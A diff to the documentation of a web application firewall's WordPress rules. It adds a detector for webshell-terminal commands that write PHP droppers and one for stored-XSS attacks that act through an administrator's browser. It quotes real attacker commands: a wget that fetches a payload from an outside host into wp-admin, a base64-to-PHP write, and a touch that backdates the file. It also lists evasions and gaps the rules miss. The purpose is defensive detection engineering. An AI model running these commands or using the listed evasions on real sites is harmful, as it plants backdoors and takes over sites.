@@ -1065,6 +1065,12 @@ Current assignments:
                                                                     expected noise: other apps' admin areas
                                                                     (OpenCart, PrestaShop, Drupal, WHMCS tickets); runs after
                                                                     the 421-439 scanners so it never takes their headline)
+                                       331  rule_shell_write_exec   (logonly, 2026-10-27: a shell command in the args OR body
+                                                                    that writes an executable file — wget/curl output, a
+                                                                    > / >> redirect or a tee, to .php*/.phtml/.phar/.inc/
+                                                                    .htaccess/.user.ini — or backdates one with touch -d/-t/-r; the
+                                                                    tophair.gr webshell terminal's commands, which 310-317
+                                                                    (query string only) never saw. See "Rule 331" below)
 
 4xx — Upload / malware
   401  rule_upload_filename            405  rule_script_obfuscation
@@ -1092,7 +1098,7 @@ Current assignments:
 5xx — Auth abuse
   501  rule_auth_burst                 510  rule_xmlrpc_multicall
   502  rule_auth_wp_checks             511  rule_xmlrpc_pingback
-                                       512  rule_xmlrpc_post_burst
+  503  rule_wp_admin_cross_screen      512  rule_xmlrpc_post_burst
                                        520  (retired 2026-10-08: SP Page Builder contact-form mail relay)
 
 6xx — Header / protocol anomaly
@@ -1328,6 +1334,103 @@ Rules 430-436 default to `logonly`; **437 and 438 default to `challenge`** (see 
 
 ---
 
+## Rule 331 — `rule_shell_write_exec` (a webshell terminal writing a dropper)
+
+Reason family **`WAF_RCE`**, logonly, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
+`WAF_RCE:SHELL_REDIRECT_TO_EXEC` and `WAF_RCE:SHELL_TOUCH_BACKDATE`.
+
+The tophair.gr backdoor (2026-10-08) was a WPCode snippet serving a file
+manager and a terminal at `/?dark&term=1`. Its commands came as a form field
+in a POST body:
+- `wget -q https://kaye1337.pages.dev/stfu/m.jpg -O wp-admin/css/colors/midnight/colors.php`
+- `curl -o … .php`
+- `echo <base64> | base64 -d > upgrade.php`
+- `touch -d '2025-07-10 20:39' g.php`, to make the dropper look a year old.
+
+Rules 310-317 read the query string only, so a replay matched nothing.
+
+The rule reads the decoded, lowercased args and body (`get_norm_ab`: query,
+urlencoded, JSON and multipart values alike). It fires on a command at a
+command position:
+- the start of a value (`=`);
+- after `;`, `|`, `&`, a backtick, `$(` or a newline;
+- inside a JSON value (a quote after `:`, `[` or `,`) or `sh -c '…'`; a JSON
+  `\n` opens a command too.
+
+The raw surface is read as the shell would, with JSON's escapes. A JSON `\n`
+or `\r` ends a command, `\t` is a blank and `\"…\"` is a quoted string. A
+quote that closes the value the command sits in ends the command: a JSON
+string, a form field, or `sh -c '…'`. That is a quote followed by `,`, `}`,
+`]`, `:`, `&` or the end, or one with no closing quote. A second command in
+the same value is read on its own.
+
+The verb may sit behind an absolute path ending in `bin/` (`/usr/bin/wget`)
+or up to three prefix words: `sudo`, `nohup`, `env`, `exec`, `command`,
+`busybox`, `nice`, `time`, `xargs`, or an assignment (`HOME=/tmp wget`, never
+a form field's own `name=` at the start or after `&`). A bare `:` or `(`
+(`usage: echo …`) is prose, and a quote after anything else is markup
+(`class="cat"`). The command must do one of
+three things:
+
+| Tag | Command |
+|---|---|
+| `FETCH_TO_EXEC` | `wget` / `curl` whose output goes to an executable name. The output is `-O` / `-o` (alone or closing a flag cluster such as `-qO`, `-sSLo`), `--output`, `--output-document[=]` or `-ox.php`, or the URL's own file name: `curl -O` / `--remote-name`, and `wget` with no output option (not `--spider` / `--delete-after`). That name is the URL path's last segment, with no query: wget keeps the query in the name (`wp-cron.php?doing_wp_cron`). `-O -` is stdout (the `wget -q -O - …/wp-cron.php` cron line), not a file. |
+| `REDIRECT_TO_EXEC` | `echo` / `printf` / `cat` / `base64` / `xxd` / `wget` / `curl` / `perl` / `python[3]` / `php` / `openssl` / `gzip` / `gunzip` with a `>`, `>>`, `>\|`, `&>` or `&>>` to an executable name, or `tee [-a]` of one after a pipe (`… \| base64 -d \| tee x.php`). |
+| `TOUCH_BACKDATE` | `touch` with `-d` / `-t` / `-r` (or a cluster carrying one), `--date` or `--reference` before its first operand (`--` ends the options). |
+
+Executable names are rule 401's PHP set (`_cve_sfl_has_exec_ext`: `.php`,
+`.php[0-9]*` such as the MultiPHP `.php74`, `.phtm[l]`, `.pht`, `.phar`), plus
+`.inc`, `.htaccess` and `.user.ini`. Only the last extension counts:
+`x.php.txt` is not run. The command is read quote-aware: a `;`
+inside quotes does not end it, and quotes are stripped from file names.
+
+**Why logonly.** Form values never carry these commands, but a tutorial pasted
+into a support ticket or a blog comment can, and so can staff saving a how-to
+post. Unlike 330 the rule has no logged-in / `/wp-admin/` exemption: a dropper
+like colors.php lives under `/wp-admin/`, and the attacker who planted it holds
+an admin cookie. That staff noise is expected in the burn-in review. Run over
+the query strings of titan's access logs (2026-10-27: 1 263 vhosts, 2.03 M
+requests with a query), it logged none; bodies are not in those logs. The
+family `WAF_RCE` is autoblock-armed for block hits only, so a 331 hit never
+bans. Promote it after
+a clean hit-rate review (`### Promoting a rule`).
+
+**Cost.** The verbs are found with plain finds, and each hit is judged by
+the byte before it. A class-pattern scan of the whole surface costs ~20 ns a
+byte in LuaJIT, about 400 µs on a 19 KB body. A body that names no
+executable file (`.ph`, `.inc`, `.htaccess`, `.user.ini`) reads `touch` alone,
+and returns after five plain finds when it has no `touch` either. The surface
+is read in place, never copied. Every read-back from a verb is bounded, and
+a verb's scan skips the occurrences inside the command it last parsed, so
+the cost is linear in the body. A command is read for at most 4 KB, 32 words
+and 256 special bytes (a quoted payload is one word and one step), and each
+verb parses at most 64 commands a request. Measured alone on
+a dev box:
+- under 1 µs on small requests, on 14 KB form posts and on 19 KB of prose
+  that names no executable file;
+- about 100-160 µs on 19 KB of prose, JSON or markup naming `.php` and a verb
+  on every line;
+- about 0.1-1.5 ms on a 32 KB body built for it: repeated `/touch`,
+  `sudo wget`, `=wget -x`, backslash runs, JSON values, assignments, pipes
+  (up to 4 s before these bounds).
+
+A 19 KB body already costs `check()` about 5 ms, a 32 KB one about 10 ms.
+
+**Limits.**
+- A command is read for 4 KB, 32 words and 256 special bytes, and each verb
+  parses 64 commands. A real command placed behind 64 decoy commands of the
+  same verb is not read. Decoys of other verbs don't hide it.
+- The surface is lowercased, so wget's `-o` (log file) reads as `-O`
+  (output). `wget -o log.txt URL/x.php` counts as an output and hides the
+  download under the URL's name.
+- Shell tricks that hide the verb or the name defeat it: `w''get`, `$x`, `${IFS}`,
+  a relative path to the verb (`./wget`), a name built at run time, `cp` / `mv`
+  of a fetched file, a prefix outside the list above.
+- PHP's own writers (`file_put_contents`) are not shell commands: rules
+  404/433-436 judge PHP source.
+
+Tests: `scripts/tests/cfm_waf_shell_write_exec_test.lua`.
+
 ## Rule 501 — `rule_auth_burst` (login submissions)
 
 Counts credential **submissions** per IP across vhosts: `auth_burst_threshold` (8)
@@ -1385,6 +1488,141 @@ Magento's admin login padded past the cut on its bare route (`/admin/…`, where
 names outside the list (`session[password]`, Symfony `_password`, an array-wrapped or
 BOM-prefixed JSON body). An OpenCart admin
 customer save sends an empty `password=` and counts; eight in 20 s is not a workflow.
+
+## Rule 503 — `rule_wp_admin_cross_screen` (a stored XSS driving an admin's browser)
+
+Reason family **`WAF_ADMIN_XSCREEN`**, logonly. A stored XSS needs no exploit
+to take a WordPress site: its script runs in an administrator's browser with
+that session's cookie and nonces, and every request it sends is a legitimate
+admin request. On tophair.gr (2026-10-06) staff opened an order carrying the
+PixelYourSite payload (CVE-2026-1844); within five seconds their own browser
+fetched `user-new.php` and `plugin-install.php?tab=upload` for the nonces,
+POSTed `user-new.php` (a new administrator) and
+`update.php?action=upload-plugin` (a backdoor plugin as a ZIP), all with the
+**order screen** as the Referer. No content rule could see it: the user is
+logged in, the plugin is compressed, nothing in the body is an attack.
+
+What gives it away is where the request came from. WordPress submits these
+forms only from their own screen, as a navigation a click started:
+
+| tag | signal |
+|---|---|
+| `<EP>:SCRIPT` / `<EP>:FRAME` | any `Sec-Fetch-Dest` but `document`: framed (`iframe`, `frame`, `object`, `embed`) is FRAME, the rest (fetch/XHR `empty`, `<img>`, `<script>`, …) SCRIPT. A script can set a same-origin Referer (`fetch(…, {referrer})`) or drop it (a meta referrer policy), but not Fetch Metadata. |
+| `<EP>:FROM:<screen>` | a same-host Referer from another admin screen (`post.php`, `admin.php`, …) or the front end (`front`). |
+| `<EP>:CROSS_SITE` | `Sec-Fetch-Site: cross-site`. |
+| `<EP>:NO_ACTIVATION` | a document navigation (`Sec-Fetch-Mode: navigate`, `Dest: document`) without `Sec-Fetch-User`: a `form.submit()` no click started. |
+| `<EP>:NO_REFERER` | an XHR leg (admin-ajax, REST) called same-origin (`Sec-Fetch-Site`) with no Referer or a bare origin; a WordPress admin page sends the full URL (`strict-origin-when-cross-origin`). |
+| `NONCE_SCRAPE:<screen>` / `NONCE_FRAME:<screen>` | a GET of a nonce-bearing screen (`user-new.php`, `users.php`, `user-edit.php`, `profile.php`, `site-users.php`, `plugins.php`, `plugin-install.php`, `theme-install.php`, `options-general.php`, the file editors) by a script or markup (not a `Sec-Purpose: prefetch`), or framed (not `plugin-install.php?tab=plugin-information`, WordPress's own thickbox). |
+
+`<EP>` is (WordPress reads these from `$_REQUEST`, so the legs match any
+method that carries the action):
+- `USER_NEW` (`user-new.php`: any POST, or a GET `action=adduser` /
+  `createuser`), `USER_EDIT` (`user-edit.php`), `PROFILE` (`profile.php`, also
+  from `user-edit.php`: saving your own account there posts to `profile.php`),
+  `SITE_USERS` (multisite `site-users.php`, incl. `remove`);
+- `USERS` (`users.php`: a POST, or `action=dodelete` / `doremove`) and
+  `USERS_ROLE` (its role change: `changeit` / `changeit2` / `action=promote`,
+  which WordPress sends as a **GET** of the list's own form);
+- `OPTIONS_GENERAL` (`options.php` with `option_page=general`:
+  `users_can_register`, `default_role`, `new_admin_email`; from
+  `options-general.php`). Other `option_page`s are out of scope: plugin
+  settings pages post to `options.php` from `admin.php?page=…`;
+- `UPLOAD_PLUGIN` / `UPLOAD_THEME` (`update.php?action=upload-…`, POST or
+  the GET that installs an uploaded package, `&package=<attachment id>`; from
+  the install screen or `update.php`) and `INSTALL_PLUGIN` / `INSTALL_THEME`
+  (`update.php?action=install-…`, the wordpress.org install; from
+  `plugin-install.php`, or `theme-install.php` / `themes.php`). An
+  `update.php` POST whose action lies past the edge's body window is `UPLOAD`
+  (update.php takes nothing but uploads by POST);
+- `ACTIVATE` (`plugins.php` `action=activate` / `activate-selected`, and
+  `update.php?action=activate-plugin`, which also includes the plugin under
+  `failure=true`): Fetch Metadata only, never the Referer, as themes and
+  plugins put "Activate" links on their own pages;
+- `FILE_EDITOR`: a POST to `theme-editor.php` / `plugin-editor.php` (the
+  non-AJAX save) from its own screen, and admin-ajax
+  `edit-theme-plugin-file`; `AJAX_PLUGIN`
+  (admin-ajax `install-plugin` / `activate-plugin`, from `plugins.php` /
+  `plugin-install.php`): Referer and `NO_REFERER` only, as admin-ajax is always
+  XHR. A spoofed Referer is a residual;
+- `REST_USERS`, `REST_APP_PASSWORD`, `REST_PLUGINS`: a cookie-authenticated
+  REST write, routed as WordPress routes it. Every `rest_route` field (any
+  spelling PHP registers: `rest.route`, `rest[route`, an encoded name) is a
+  candidate and overrides the `/wp-json/` path. Routes match
+  case-insensitively after untrailingslashit (every trailing `/` or `\`),
+  and PCRE's `$` also matches before one final newline (`%0A`). A
+  `rest_route` on a path WordPress's rewrite sends to `index.php` counts too,
+  even under `/wp-admin/`. A GET counts as a write under `_method` or
+  `X-HTTP-Method-Override`.
+  - `/wp/v2/users` and `/users/<id>`: any write, and no screen is allowed, so
+    any Referer is logged (`FROM:<screen>`).
+  - `/users/me`: only a write naming an account field (`email`, `password`,
+    `roles`, `username`) as a JSON or form KEY, not a value that mentions it.
+    The block editor (`persisted_preferences`) and wc-admin
+    (`woocommerce_meta`) save their preferences there.
+  - `/users/<id|me>/application-passwords`: allowed from `profile.php`,
+    `user-edit.php` and `authorize-application.php`, the screens that create
+    them.
+  - `/wp/v2/plugins`: allowed from `plugins.php` / `plugin-install.php`. The
+    block editor's block directory installs plugins from `post.php`, so
+    `REST_PLUGINS:FROM:post.php` needs a look in the burn-in.
+
+Fields are read as PHP registers them (`php_request_fields`), any value rather
+than PHP's last (the project's rule: a trailing duplicate past
+`max_input_vars` is a decoy PHP never saw). The admin screen is what follows
+the FIRST `/wp-admin/` (as WordPress's `$pagenow`; subdirectory installs keep
+their prefix), without the multisite `network/` and `user/` prefixes, cut at
+its `.php` (Apache's AcceptPathInfo runs `user-new.php/x` as
+`user-new.php`). A bare-origin Referer (`Referrer-Policy: origin` /
+`strict-origin`: `https://host/`, never a query) names no screen. On a form
+it is no signal, like a missing one; on an XHR leg it counts as missing
+(`NO_REFERER`). A `/` with a query (plain permalinks, `/?product=x`) is the
+front end.
+
+The step runs last but 612, after every armed block-tier rule, because a
+block promotion must hold the autoblock: a held block evaluated earlier takes
+the headline and ends evaluation before an armed rule's ban.
+
+Only with a `wordpress_logged_in_` cookie. No Referer is no signal (a
+`no-referrer` policy), and a cross-host Referer without `Sec-Fetch-Site` is
+left to the nonce. `options.php` is out of scope: plugin settings pages post
+to it from `admin.php?page=…` (nine distinct screens on titan).
+
+**Push window.** `WAF_ADMIN_XSCREEN` keeps its leg in the push key
+(`PUSH_KEY_KEEPS_TAG`): a kill chain sends several legs from one IP within
+seconds, and a family-keyed window logged only the first (the nonce scrape,
+not the user or the plugin). A flood of one leg still collapses to one push
+per window.
+
+**Limits (what four review rounds taught).** A rule that enumerates WordPress's
+privileged endpoints is never complete: core alone has many routes to the
+same outcome, every round found more, and plugins add their own. 503 is a
+detector for the stored-XSS kill chain as it is run today. It is not a seal.
+Known residuals:
+- an action no leg lists;
+- a body padded past the edge's body window, which hides a field: the same
+  limit every body rule has;
+- a spoofed Referer on an XHR leg (admin-ajax, REST), where Fetch Metadata
+  cannot help;
+- a browser without Fetch Metadata (Safari < 16.4), where only the Referer
+  speaks.
+
+The backstop for all of these is watching the outcome, not the request: a new
+administrator, a new plugin or a PHP file written by the web user (see the
+2026-10-27 gap analysis, D1/D2).
+
+**FP baseline (titan, 545 access logs, 2026-09/10):** `user-new.php` 53 POSTs
+from its own screen + 1 other; `upload-plugin` 332 from `plugin-install.php`
++ 1 without a Referer + 1 other; `users.php` 108 and `upload-theme` 13, all
+from their own screen. Both "other" were the tophair attack. The access logs
+carry no Fetch Metadata, so the SCRIPT / NO_ACTIVATION signals have no
+baseline yet: the burn-in measures them.
+
+**Promotion.** The client IP is the victim's (a staff member's browser), never
+the attacker's: a block promotion must set `HoldAutoblock` on rule 503 so the
+edge 403s without an nft ban. A hit means the site already stores a payload
+in something an administrator just opened (an order, a comment, a product
+review, a form entry): find and clean it, as the PixelYourSite clean-up did
+for `pys_enrich_data`.
 
 ## XML-RPC rules (510-512) and the Jetpack carve-out
 
